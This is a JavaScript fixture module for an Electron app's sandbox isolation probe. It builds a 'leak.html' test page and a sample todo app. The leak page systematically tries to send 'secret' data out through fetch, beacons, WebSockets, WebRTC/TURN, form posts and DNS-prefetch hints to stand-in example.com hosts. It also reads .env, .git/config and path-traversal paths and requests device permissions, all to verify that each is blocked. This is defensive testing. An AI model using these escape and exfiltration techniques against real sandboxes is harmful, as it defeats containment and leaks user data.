// Pages the isolation probe writes into a task workspace, as an agent would
// (plan 2.6 "Electron 통합 프로브"). `leak.html` tries every way out it can
// think of and reports what happened; nothing here is shipped with the app.
'use strict';

function leakPage({ httpPort, udpPort, tcp6Port, udp6Port, marker, webrtc }) {
  const script = String.raw`
const WEBRTC = ${JSON.stringify(webrtc)};
${TRANSPORTS_SOURCE}
const H = "http://127.0.0.1:${httpPort}";
const H6 = "http://[::1]:${tcp6Port}";
const WS = "ws://127.0.0.1:${httpPort}";
const TCP = ${httpPort};
const UDP = ${udpPort};
const UDP6 = ${udp6Port};
const MARK = "${marker}";
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const within = (promise, ms = 4000) => Promise.race([promise, sleep(ms).then(() => { throw new Error("timeout"); })]);
const describe = error => String(error && (error.name && error.name !== "Error" ? error.name + ": " : "") + (error && error.message || error));
const out = {};
async function attempt(name, fn, ms) {
  try { out[name] = { ok: true, value: await within(Promise.resolve().then(fn), ms) }; }
  catch (error) { out[name] = { ok: false, error: describe(error) }; }
}
function element(tag, attributes, ms = 1500) {
  return new Promise((resolve, reject) => {
    const node = document.createElement(tag);
    Object.assign(node, attributes);
    node.onload = () => resolve("loaded");
    node.onerror = () => reject(new Error(tag + " error"));
    document.body.append(node);
    setTimeout(() => resolve("noEvent"), ms);
  });
}
// T1: every way to send something out. Also run again by the probe with
// CSP bypassed (then webRequest must stop it) and without webRequest (then
// the dead proxy must): each layer alone holds.
window.runNetwork = async () => {
  for (const key of Object.keys(out)) delete out[key];
  await network();
  return { ...out };
};
window.runProbe = async () => {
  await network();
  await rest();
  return out;
};
async function network() {
  await attempt("fetchLoopback", () => fetch(H + "/fetch?s=secret").then(r => r.status));
  await attempt("fetchLoopback6", () => fetch(H6 + "/fetch6").then(r => r.status));
  await attempt("websocket6", () => new Promise((resolve, reject) => { const w = new WebSocket("ws://[::1]:${tcp6Port}/ws6"); w.onopen = () => resolve("open"); w.onerror = () => reject(new Error("ws error")); }));
  await attempt("fetchNoCors", () => fetch(H + "/nocors", { mode: "no-cors" }).then(r => r.type));
  await attempt("fetchExternal", () => fetch("https://" + MARK + "-fetch.example.com/").then(r => r.status));
  await attempt("xhr", () => new Promise((resolve, reject) => { const x = new XMLHttpRequest(); x.open("GET", H + "/xhr"); x.onload = () => resolve(x.status); x.onerror = () => reject(new Error("xhr error")); x.send(); }));
  await attempt("image", () => element("img", { src: H + "/img.png" }));
  await attempt("imageExternal", () => element("img", { src: "https://" + MARK + "-img.example.com/x.png" }));
  await attempt("beacon", () => navigator.sendBeacon(H + "/beacon", "secret"));
  await attempt("websocket", () => new Promise((resolve, reject) => { const w = new WebSocket(WS + "/ws"); w.onopen = () => resolve("open"); w.onerror = () => reject(new Error("ws error")); }));
  await attempt("eventSource", () => new Promise((resolve, reject) => { const e = new EventSource(H + "/sse"); e.onopen = () => resolve("open"); e.onerror = () => { e.close(); reject(new Error("sse error")); }; }));
  await attempt("script", () => element("script", { src: H + "/s.js" }));
  await attempt("stylesheet", () => element("link", { rel: "stylesheet", href: H + "/s.css" }));
  await attempt("cssImport", async () => { const s = document.createElement("style"); s.textContent = "@import url(" + H + "/import.css); .bg { background: url(" + H + "/bg.png) }"; document.head.append(s); const d = document.createElement("div"); d.className = "bg"; document.body.append(d); await sleep(800); return "attempted"; });
  await attempt("font", () => new FontFace("leak", "url(" + H + "/f.woff2)").load().then(() => "loaded"));
  await attempt("dynamicImport", () => import(H + "/m.js").then(() => "imported"));
  await attempt("audio", () => new Audio(H + "/a.mp3").play().then(() => "playing"));
  await attempt("hints", async () => {
    for (const [rel, href] of [["dns-prefetch", "//" + MARK + "-dns.example.com"], ["preconnect", "https://" + MARK + "-preconnect.example.com"], ["prefetch", H + "/prefetch"], ["preconnect", H], ["prerender", H + "/prerender"]]) {
      const link = document.createElement("link"); link.rel = rel; link.href = href; document.head.append(link);
    }
    const a = document.createElement("a"); a.href = "https://" + MARK + "-anchor.example.com/"; a.textContent = "x"; document.body.append(a);
    await sleep(1500); return "attempted";
  });
  await attempt("iframeExternal", () => element("iframe", { src: H + "/frame" }));
  await attempt("worker", () => new Promise((resolve, reject) => {
    const code = "fetch('" + H + "/worker').then(r => postMessage('status ' + r.status), e => postMessage('error ' + e.name))";
    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })));
    worker.onmessage = event => resolve(event.data); worker.onerror = () => reject(new Error("worker error"));
  }));
  await attempt("formPost", async () => {
    const frame = document.createElement("iframe"); frame.name = "sink"; document.body.append(frame);
    const form = document.createElement("form"); form.action = H + "/form"; form.method = "post"; form.target = "sink";
    const input = document.createElement("input"); input.name = "s"; input.value = "secret"; form.append(input); document.body.append(form);
    form.submit(); await sleep(1000); return "submitted";
  });
  // T2: WebRTC, one transport at a time (STUN v4/v6, TURN udp v4/v6, TURN
  // tcp v4/v6, TURN tls v4/v6, an outside STUN name), each against its own
  // collector. Each may take up to 8.3 s, so the whole run gets its own deadline.
  await attempt("webrtcTransports", () => probeTransports(WEBRTC), Object.keys(WEBRTC).length * 8_500 + 2_000);
}
async function rest() {
  // T6: no app bridge, no Node.
  out.bridges = Object.fromEntries(["m5", "m5Preview", "m5Projects", "m5Login", "require", "process", "ipcRenderer", "electron", "module", "Buffer"].map(name => [name, typeof window[name]]));
  // T7: no way to write.
  for (const method of ["POST", "PUT", "DELETE", "PATCH"]) await attempt("method" + method, () => fetch("leak.html", { method, body: method === "DELETE" ? undefined : "x" }).then(r => r.status));
  out.filePickers = ["showSaveFilePicker", "showOpenFilePicker", "showDirectoryPicker"].map(name => typeof window[name]);
  await attempt("download", async () => { const a = document.createElement("a"); a.href = "data.txt"; a.download = "data.txt"; document.body.append(a); a.click(); await sleep(800); return "clicked"; });
  // T4·T5 through the origin.
  out.paths = {};
  for (const path of [".env", ".git/HEAD", ".git/config", "a/.secret/x.js", "secret.pem", "link.txt", "../outside.txt", "%2e%2e/outside.txt", "a%2f..%2f..%2foutside.txt", "data.txt"]) {
    try { const response = await fetch(path); out.paths[path] = response.status; } catch (error) { out.paths[path] = describe(error); }
  }
  // T13
  await attempt("serviceWorker", () => navigator.serviceWorker ? navigator.serviceWorker.register("sw.js").then(() => "registered") : Promise.reject(new Error("unavailable")));
  // T9 (windows are tried again with a user gesture, see runPermission)
  await attempt("frameRefresh", async () => {
    const frame = document.createElement("iframe"); frame.src = "refresh.html"; document.body.append(frame);
    await sleep(2000); return frame.contentWindow.location.pathname;
  });
  await attempt("frameNavigate", async () => {
    const frame = document.createElement("iframe"); frame.src = "data.txt"; document.body.append(frame);
    await sleep(500); frame.src = H + "/framenav"; await sleep(1000);
    try { return frame.contentWindow.location.pathname; } catch (error) { return "crossOrigin " + describe(error); }
  });
  await attempt("eval", () => eval("1 + 1"));
  // T12: this preview's storage (the probe checks another preview cannot see it).
  out.storageBefore = localStorage.getItem("probe-key");
  localStorage.setItem("probe-key", "leak-page");
  out.location = location.href;
}
// T10 and T9 with a user gesture: the probe calls each one through
// executeJavaScript(…, userGesture) after focusing the view, so a refusal
// comes from the permission handlers, not from a missing activation.
const PERMISSIONS = {
  camera: () => navigator.mediaDevices.getUserMedia({ video: true }).then(() => "granted"),
  microphone: () => navigator.mediaDevices.getUserMedia({ audio: true }).then(() => "granted"),
  displayMedia: () => navigator.mediaDevices.getDisplayMedia({ video: true }).then(() => "granted"),
  geolocation: () => new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(() => resolve("granted"), error => reject(new Error("geolocation code " + error.code)))),
  notification: () => Notification.requestPermission(),
  clipboardRead: () => navigator.clipboard.readText().then(() => "read"),
  hid: () => navigator.hid ? navigator.hid.requestDevice({ filters: [] }).then(devices => devices.length ? "granted" : "none") : Promise.reject(new Error("api absent")),
  usb: () => navigator.usb ? navigator.usb.requestDevice({ filters: [] }).then(() => "granted") : Promise.reject(new Error("api absent")),
  serial: () => navigator.serial ? navigator.serial.requestPort().then(() => "granted") : Promise.reject(new Error("api absent")),
  midi: () => navigator.requestMIDIAccess({ sysex: true }).then(() => "granted"),
  // A denied request may stay pending: what counts is that the page never became full screen.
  fullscreen: async () => {
    let reason = "pending";
    try { await within(document.documentElement.requestFullscreen(), 2000); reason = "resolved"; } catch (error) { reason = describe(error); }
    if (document.fullscreenElement) return "granted";
    throw new Error("fullscreen refused (" + reason + ")");
  },
  permissionGeolocation: () => navigator.permissions.query({ name: "geolocation" }).then(status => status.state),
  permissionCamera: () => navigator.permissions.query({ name: "camera" }).then(status => status.state),
  windowOpen: () => window.open(H + "/open") === null ? "null" : "opened",
  targetBlank: async () => { const a = document.createElement("a"); a.href = H + "/blank"; a.target = "_blank"; document.body.append(a); a.click(); await sleep(500); return "clicked"; },
};
window.PERMISSION_NAMES = Object.keys(PERMISSIONS);
// What held right before the call (review I5): the call had a user
// activation and focus, so a refusal is the boundary's, not the browser's.
const POLICY_FEATURE = {
  camera: "camera", microphone: "microphone", displayMedia: "display-capture", geolocation: "geolocation", clipboardRead: "clipboard-read",
  hid: "hid", usb: "usb", serial: "serial", midi: "midi", fullscreen: "fullscreen", permissionGeolocation: "geolocation", permissionCamera: "camera",
};
window.runPermission = async (name) => {
  const policy = document.permissionsPolicy || document.featurePolicy;
  const feature = POLICY_FEATURE[name];
  // The document's own Permissions-Policy verdict: false is the response
  // header refusing the feature for this page.
  const policyAllows = feature && policy?.allowsFeature ? policy.allowsFeature(feature) : null;
  const before = { active: navigator.userActivation?.isActive === true, focused: document.hasFocus(), policyAllows };
  try { return { ok: true, value: await within(Promise.resolve().then(PERMISSIONS[name])), before }; }
  catch (error) { return { ok: false, error: describe(error), before }; }
};
`;
  return `<!doctype html><html><head><meta charset="utf-8"><title>leak</title></head><body><p id="status">ready</p><script>${script}</script></body></html>`;
}

/**
 * One RTCPeerConnection per ICE server, so every transport is observed on
 * its own: the gathering must end ("complete") or the server must report an
 * error; a transport still silent at the deadline is recorded as
 * "timeout" (never a pass). TURN runs relay-only, so only the relay path is
 * tried. Shared by the preview page and the unrestricted control page.
 */
const TRANSPORTS_SOURCE = String.raw`
async function probeTransports(servers) {
  const wait = ms => new Promise(resolve => setTimeout(resolve, ms));
  const results = {};
  for (const [name, server] of Object.entries(servers)) {
    const startedAt = performance.now();
    const pc = new RTCPeerConnection({ iceServers: [server], iceTransportPolicy: /^turns?:/.test(server.urls) ? "relay" : "all" });
    const candidates = [];
    const errors = [];
    pc.onicecandidate = event => { if (event.candidate) candidates.push({ type: event.candidate.type, protocol: event.candidate.protocol }); };
    pc.onicecandidateerror = event => errors.push({ code: event.errorCode, text: String(event.errorText || "").slice(0, 80) });
    const done = new Promise(resolve => { pc.onicegatheringstatechange = () => { if (pc.iceGatheringState === "complete") resolve("complete"); }; });
    pc.createDataChannel("x");
    await pc.setLocalDescription(await pc.createOffer());
    const gathering = await Promise.race([done, wait(8000).then(() => "timeout")]);
    // A moment more so a late send would still reach the collector.
    await wait(300);
    results[name] = { gathering, candidates, errors, ms: Math.round(performance.now() - startedAt) };
    pc.close();
  }
  return results;
}`;

function controlPage(webrtc) {
  return `<!doctype html><meta charset="utf-8"><script>${TRANSPORTS_SOURCE}\nwindow.runControl = () => probeTransports(${JSON.stringify(webrtc)});</script>`;
}

const TODO_PAGE = `<!doctype html>
<html lang="ko"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>할 일</title><link rel="stylesheet" href="todo.css"></head>
<body><main><h1>할 일</h1>
<form id="add"><input id="text" placeholder="할 일을 적어 주세요" autocomplete="off"><button>추가</button></form>
<ul id="list"></ul><p id="count"></p></main>
<script src="todo.js"></script></body></html>`;
const TODO_CSS = `body{font-family:-apple-system,system-ui,sans-serif;background:#f6f7f9;margin:0;padding:24px;color:#1d2433}
main{max-width:520px;margin:0 auto;background:#fff;border-radius:12px;padding:20px;box-shadow:0 2px 12px #0001}
form{display:flex;gap:8px}input{flex:1;padding:10px;border:1px solid #ccd;border-radius:8px;font-size:16px}
button{padding:10px 16px;border:0;border-radius:8px;background:#3b6cf6;color:#fff;font-size:16px}
li{padding:10px 4px;border-bottom:1px solid #eee;list-style:none}li.done{text-decoration:line-through;color:#889}
ul{padding:0}@media (max-width:420px){body{padding:8px}h1{font-size:22px}}`;
const TODO_JS = `const key = "todos";
const load = () => JSON.parse(localStorage.getItem(key) || "[]");
const save = items => localStorage.setItem(key, JSON.stringify(items));
function render() {
  const items = load(); const list = document.getElementById("list"); list.textContent = "";
  for (const [index, item] of items.entries()) {
    const li = document.createElement("li"); li.textContent = item.text; li.className = item.done ? "done" : "";
    li.onclick = () => { const next = load(); next[index].done = !next[index].done; save(next); render(); };
    list.append(li);
  }
  document.getElementById("count").textContent = items.filter(item => !item.done).length + "개 남음";
}
document.getElementById("add").onsubmit = event => {
  event.preventDefault(); const input = document.getElementById("text");
  if (!input.value.trim()) return; save([...load(), { text: input.value.trim(), done: false }]); input.value = ""; render();
};
render();`;

const FILES = {
  "index.html": TODO_PAGE,
  "todo.css": TODO_CSS,
  "todo.js": TODO_JS,
  "data.txt": "workspace data\n",
  "refresh.html": '<!doctype html><meta http-equiv="refresh" content="0;url=REFRESH_TARGET"><p>refresh</p>',
  "sw.js": "self.addEventListener('fetch', () => {});",
  "hang.html": '<!doctype html><p id="s">hang</p><script>setTimeout(() => { for (;;) {} }, 300)</script>',
  "b.html": '<!doctype html><p>b</p><script>localStorage.setItem("probe-key", "workspace-b")</script>',
  "b.txt": "workspace b only\n",
  ".env": "fixture-only\n",
  "secret.pem": "fixture-only\n",
};

module.exports = { leakPage, controlPage, FILES };
